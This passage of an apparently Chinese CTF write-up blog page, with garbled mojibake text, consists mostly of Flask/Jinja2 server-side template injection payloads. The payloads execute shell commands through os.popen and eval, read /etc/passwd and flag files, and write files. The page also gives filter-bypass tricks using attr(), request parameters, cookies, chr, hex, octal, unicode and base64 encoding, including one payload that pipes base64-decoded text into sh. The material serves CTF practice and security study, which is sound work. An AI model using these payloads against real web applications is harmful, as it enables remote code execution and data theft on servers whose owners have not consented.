</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Ë∞ÉÁî®evalÂáΩÊï∞ËØªÂèñ
</span></span><span class="line"><span class="cl">#python2
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&#34;)}} 
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&#34;ls&#34;)&#39;)}}
</span></span><span class="line"><span class="cl">#python3
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}} 
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}}
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Ë∞ÉÁî® importlibÁ±ª
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[128][&#34;load_module&#34;](&#34;os&#34;)[&#34;popen&#34;](&#34;ls /&#34;).read()}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Ë∞ÉÁî®linecacheÂáΩÊï∞
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&#39;ls /&#39;).read()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen(&#39;ls /&#39;).read()}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Ë∞ÉÁî®communicate()ÂáΩÊï∞
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[128](&#39;whoami&#39;,shell=True,stdout=-1).communicate()[0].strip()}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#ÂÜôÊñá‰ª∂
</span></span><span class="line"><span class="cl">ÂÜôÊñá‰ª∂ÁöÑËØùÂ∞±Áõ¥Êé•Êää‰∏äÈù¢ÁöÑÊûÑÈÄ†ÈáåÁöÑread()Êç¢Êàêwrite()Âç≥ÂèØÔºå‰∏ãÈù¢‰∏æ‰æãÂà©Áî®fileÁ±ªÂ∞ÜÊï∞ÊçÆÂÜôÂÖ•Êñá‰ª∂„ÄÇ
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__bases__[0].__subclasses__()[40](&#39;/tmp&#39;).write(&#39;test&#39;)}}  ----python2ÁöÑstrÁ±ªÂûã‰∏çÁõ¥Êé•‰ªéÂ±û‰∫éÂ±û‰∫éÂü∫Á±ªÔºåÊâÄ‰ª•Ë¶Å‰∏§Ê¨° .__bases__
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).write(&#39;123456&#39;)}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#ÈÄöÁî® getshell
</span></span><span class="line"><span class="cl">ÂéüÁêÜÂ∞±ÊòØÊâæÂà∞Âê´Êúâ __builtins__ ÁöÑÁ±ªÔºåÁÑ∂ÂêéÂà©Áî®„ÄÇ
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;) }}{% endif %}{% endfor %}
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ÊúâËøáÊª§ÁªïËøá-">ÊúâËøáÊª§‚Äî‚ÄîÁªïËøá .</h5>
<p>1.‰∏≠Êã¨Âè∑[]ÁªïËøá</p>
<p>ÂèØ‰ª•Âà©Áî® [ ]‰ª£Êõø . ÁöÑ‰ΩúÁî®„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__}} ÂèØ‰ª•ÊõøÊç¢‰∏∫Ôºö{{()[&#34;__class__&#34;]}}
</span></span><span class="line"><span class="cl">‰∏æ‰æãÔºö
</span></span><span class="line"><span class="cl">{{()[&#39;__class__&#39;][&#39;__base__&#39;][&#39;__subclasses__&#39;]()[433][&#39;__init__&#39;][&#39;__globals__&#39;][&#39;popen&#39;](&#39;whoami&#39;)[&#39;read&#39;]()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.attr()ÁªïËøá</p>
<p>ÂéüÁîü JinJa2 ÁöÑ <code>attr()</code> ÂáΩÊï∞‚Äî‚ÄîËé∑ÂèñÂØπË±°ÁöÑÂ±ûÊÄß„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__}} 
</span></span><span class="line"><span class="cl">ÂèØ‰ª•ÊõøÊç¢‰∏∫Ôºö
</span></span><span class="line"><span class="cl">{{()|attr(&#34;__class__&#34;)}}
</span></span><span class="line"><span class="cl">{{getattr(&#39;&#39;,&#34;__class__&#34;)}}
</span></span><span class="line"><span class="cl">‰∏æ‰æãÔºö
</span></span><span class="line"><span class="cl">{{()|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)|attr(&#39;__subclasses__&#39;)()|attr(&#39;__getitem__&#39;)(65)|attr(&#39;__init__&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__builtins__&#39;)|attr(&#39;__getitem__&#39;)(&#39;eval&#39;)(&#39;__import__(&#34;os&#34;).popen(&#34;whoami&#34;).read()&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ÁªïËøáÂçïÂèåÂºïÂè∑">ÁªïËøáÂçïÂèåÂºïÂè∑</h5>
<p>1.requestÁªïËøá</p>
<p>flask‰∏≠Â≠òÂú®ÁùÄ<code>request</code>ÂÜÖÁΩÆÂØπË±°ÂèØ‰ª•ÂæóÂà∞ËØ∑Ê±ÇÁöÑ‰ø°ÊÅØÔºå<code>request</code>ÂèØ‰ª•Áî®5Áßç‰∏çÂêåÁöÑÊñπÂºèÊù•ËØ∑Ê±Ç‰ø°ÊÅØÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®ÂÆÉÊù•‰º†ÈÄíÂèÇÊï∞ÁªïËøá„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}&amp;arg1=open&amp;arg2=/etc/passwd
</span></span><span class="line"><span class="cl">request.argsÊòØflask‰∏≠ÁöÑ‰∏Ä‰∏™Â±ûÊÄß,‰∏∫ËøîÂõûËØ∑Ê±ÇÁöÑÂèÇÊï∞,ÊääpathÂΩì‰ΩúÂèòÈáèÂêç,Â∞ÜÂêéÈù¢ÁöÑË∑ØÂæÑ‰º†ÂÄºËøõÊù•,ËøõËÄåÁªïËøá‰∫ÜÂºïÂè∑ÁöÑËøáÊª§„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ëã•argsË¢´ËøáÊª§‰∫ÜÔºåËøòÂèØ‰ª•‰ΩøÁî®valuesÊù•Êé•ÂèóGETÊàñËÄÖPOSTÂèÇÊï∞„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ÂèØÊ†πÊçÆÈ¢òÁõÆËøáÊª§ÁöÑ‰∏úË•øÂä®ÊÄÅË∞ÉÊï¥ÊñπÊ≥ïÊù•ËøõË°åÁªïËøá
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}
</span></span><span class="line"><span class="cl">Cookie:arg1=open;arg2=/etc/passwd
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}
</span></span><span class="line"><span class="cl">post:arg1=open&amp;arg2=/etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.chrÁªïËøá</p>
<p>‰ΩøÁî®GETËØ∑Ê±ÇÔºå+Âè∑ËÆ∞ÂæóurlÁºñÁ†ÅÔºåÂê¶ÂàôË¢´ÂΩì‰ΩúÁ©∫Ê†ºÂ§ÑÁêÜ„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%}{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ÁªïËøáÂÖ≥ÈîÆÂ≠ó">ÁªïËøáÂÖ≥ÈîÆÂ≠ó</h5>
<p>1.ÂèçËΩ¨Ôºå‰ΩøÁî®ÂàáÁâáÂ∞ÜÈÄÜÁΩÆÁöÑÂÖ≥ÈîÆÂ≠óÈ°∫Â∫èËæìÂá∫ÔºåËøõËÄåËææÂà∞ÁªïËøá„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;&#34;[&#34;__cla&#34;&#34;ss__&#34;]
</span></span><span class="line"><span class="cl">&#34;&#34;.__getattribute__(&#34;__cla&#34;&#34;ss__&#34;)
</span></span><span class="line"><span class="cl">ÂèçËΩ¨
</span></span><span class="line"><span class="cl">&#34;&#34;[&#34;__ssalc__&#34;][::-1]
</span></span><span class="line"><span class="cl">&#34;&#34;.__getattribute__(&#34;__ssalc__&#34;[::-1])
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.+Âè∑ÔºåÂà©Áî®&quot;+&ldquo;ËøõË°åÂ≠óÁ¨¶‰∏≤ÊãºÊé•ÔºåÁªïËøáÂÖ≥ÈîÆÂ≠óËøáÊª§„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{()[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#34;__im&#34;+&#34;port__(&#39;o&#39;+&#39;s&#39;).po&#34;&#34;pen(&#39;whoami&#39;).read()&#34;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>3.joinÊãºÊé•ÔºåÂà©Áî®join()ÂáΩÊï∞Êù•ÁªïËøáÂÖ≥ÈîÆÂ≠óËøáÊª§</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[40](&#34;fla&#34;.join(&#34;/g&#34;)).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.Âà©Áî®ÂºïÂè∑ÁªïËøáÔºå‰ª•Áî®‚ÄúÊàñ‚ÄùÁöÑÂΩ¢ÂºèÊù•ÁªïËøáÔºö<code>fl&quot;&quot;ag``fl''ag</code>„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[40](&#34;/fl&#34;&#34;ag&#34;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>5.‰ΩøÁî®strÂéüÁîüÂáΩÊï∞replaceÊõøÊç¢ÔºåÂ∞ÜÈ¢ùÂ§ñÁöÑÂ≠óÁ¨¶ÊãºÊé•ËøõÂéüÊú¨ÁöÑÂÖ≥ÈîÆÂ≠óÈáåÈù¢ÔºåÁÑ∂ÂêéÂà©Áî®replaceÂáΩÊï∞Â∞ÜÂÖ∂ÊõøÊç¢‰∏∫Á©∫„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__getattribute__(&#39;__claAss__&#39;.replace(&#34;A&#34;,&#34;&#34;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>6.asciiËΩ¨Êç¢ÔºåÂ∞ÜÊØè‰∏Ä‰∏™Â≠óÁ¨¶ÈÉΩËΩ¨Êç¢‰∏∫asciiÂÄºÂêéÂÜçÊãºÊé•Âú®‰∏ÄËµ∑„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;{0:c}&#34;.format(97)=&#39;a&#39;
</span></span><span class="line"><span class="cl">&#34;{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}&#34;.format(95,95,99,108,97,115,115,95,95)=&#39;__class__&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>7.16ËøõÂà∂ÁºñÁ†ÅÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;__class__&#34;==&#34;\x5f\x5fclass\x5f\x5f&#34;==&#34;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">‰æãÂ≠êÔºö
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>8.base64ÁºñÁ†ÅÁªïËøáÔºåpython2ÔºåÂèØ‰ª•Âà©Áî®base64ËøõË°åÁªïËøáÔºåpython3Ê≤°ÊúâdecodeÊñπÊ≥ïÔºåÊâÄ‰ª•‰∏çËÉΩÁî®ËØ•ÊñπÊ≥ïÁªïËøá„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;__class__&#34;==(&#34;X19jbGFzc19f&#34;).decode(&#34;base64&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">‰æãÂ≠êÔºö
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;X19idWlsdGluc19f&#39;.decode(&#39;base64&#39;)][&#39;ZXZhbA==&#39;.decode(&#39;base64&#39;)](&#39;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#39;.decode(&#39;base64&#39;))}}
</span></span><span class="line"><span class="cl">Á≠â‰ª∑‰∫é
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>9.unicodeÁºñÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%print((((lipsum|attr(&#34;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#34;))|attr(&#34;\u0067\u0065\u0074&#34;)(&#34;os&#34;))|attr(&#34;\u0070\u006f\u0070\u0065\u006e&#34;)(&#34;\u0074\u0061\u0063\u0020\u002f\u0066\u002a&#34;))|attr(&#34;\u0072\u0065\u0061\u0064&#34;)())%}
</span></span><span class="line"><span class="cl">lipsum.__globals__[&#39;os&#39;].popen(&#39;tac /f*&#39;).read()
</span></span></code></pre></td></tr></table>
</div>
</div><p>10.HexÁºñÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#39;][&#39;\x65\x76\x61\x6c&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#39;\x6f\x73&#39;].popen(&#39;\x6c\x73\x20\x2f&#39;).read()}}
</span></span><span class="line"><span class="cl">Á≠â‰ª∑‰∫é
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>11.8ËøõÂà∂ÁºñÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;[&#39;\137\137\143\154\141\163\163\137\137&#39;].__mro__[1].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;\137\137\151\155\160\157\162\164\137\137&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ÂØπ‰∫éËøô‰∫õÁºñÁ†ÅËøõË°åÁªïËøáÂ∞±ÊòØÂ∞ÜÊòØÂ≠óÁ¨¶‰∏≤ÁöÑÂÖ≥ÈîÆÂ≠óËøõË°åÁºñÁ†ÅÁÑ∂ÂêéËøõË°åÂØπÂ∫îËß£Á†ÅÂç≥ÂèØrot13Á≠âÂÖ∂‰ªñÁºñÁ†Å‰πüÊòØÂêåÁêÜ"><em>ÂØπ‰∫éËøô‰∫õÁºñÁ†ÅËøõË°åÁªïËøáÔºåÂ∞±ÊòØÂ∞ÜÊòØÂ≠óÁ¨¶‰∏≤ÁöÑÂÖ≥ÈîÆÂ≠óËøõË°åÁºñÁ†ÅÔºåÁÑ∂ÂêéËøõË°åÂØπÂ∫îËß£Á†ÅÂç≥ÂèØÔºårot13Á≠âÂÖ∂‰ªñÁºñÁ†Å‰πüÊòØÂêåÁêÜ„ÄÇ</em></h5>
<p>12.Âà©Áî®chrÂáΩÊï∞ÔºåÊó†Ê≥ïÁõ¥Êé•‰ΩøÁî®chrÂáΩÊï∞ÔºåÈúÄË¶ÅÈÄöËøá<code>__builtins__</code>Êâæ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% set chr=url_for.__globals__[&#39;__builtins__&#39;].chr %}
</span></span><span class="line"><span class="cl">{{&#34;&#34;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>13.Âú®jinja2ÂèØ‰ª•‰ΩøÁî®~ËøõË°åÊãºÊé•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%set a=&#39;__cla&#39; %}{%set b=&#39;ss__&#39;%}{{&#34;&#34;[a~b]}}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ÁªïËøáinit">ÁªïËøáinit</h5>
<p>ÂèØ‰ª•Áî®<code>__enter__</code>Êàñ<code>__exit__</code>Êõø‰ª£</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;/etc/passwd&#39;).read()}}
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;/etc/passwd&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="3payload-2">3.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">payload1ÔºöhexÁºñÁ†ÅÁªïËøáÔºåhexÁºñÁ†Å‰∫Ücat /f*
</span></span><span class="line"><span class="cl">{{&#34;ge&#34;.__class__.__base__.__subclasses__()[133].__init__.__globals__[&#39;__builtins__&#39;].__import__(&#39;os&#39;).popen(&#39;\x63\x61\x74\x20\x2f\x66\x2a&#39;).read()}} 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">payload2ÔºöÂà©Áî®cd..ÔºåÁªïËøá/
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;cd ..&amp;&amp;cat *lag&#39;).read()&#34;)}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">payload3ÔºöÊúâÁÇπÂÉèÂèÇÊï∞ÈÄÉÈÄ∏ÁöÑÊÑèÊÄù
</span></span><span class="line"><span class="cl">{{ &#34;&#34;.__class__.__base__ .__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](request.args.get(&#34;ctfshow&#34;)).read()}}ge?ctfshow=cat /flag 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">payload4Ôºöbase64ÁºñÁ†ÅÁªïËøá
</span></span><span class="line"><span class="cl">{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;echo &#34;Y2F0IC9mbGFn&#34;|base64 -d|sh&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÊöóÁΩëËÅäÂ§©ÂÆ§">ÊöóÁΩëËÅäÂ§©ÂÆ§</h2>
<h4 id="1ÂÅöÈ¢òÊÄùË∑Ø-3">1.ÂÅöÈ¢òÊÄùË∑Ø</h4>
<p><img src="/images/%e6%9a%97%e7%bd%91%e8%81%8a%e5%a4%a9%e5%ae%a4-1.png"
	
	
	
	loading="lazy"
	
	
></p>
<h5 id="1ÂÖàËøõË°å‰∏ÄÊ≥¢‰ø°ÊÅØÊêúÈõÜ">1.ÂÖàËøõË°å‰∏ÄÊ≥¢‰ø°ÊÅØÊêúÈõÜ</h5>
<ul>
<li>
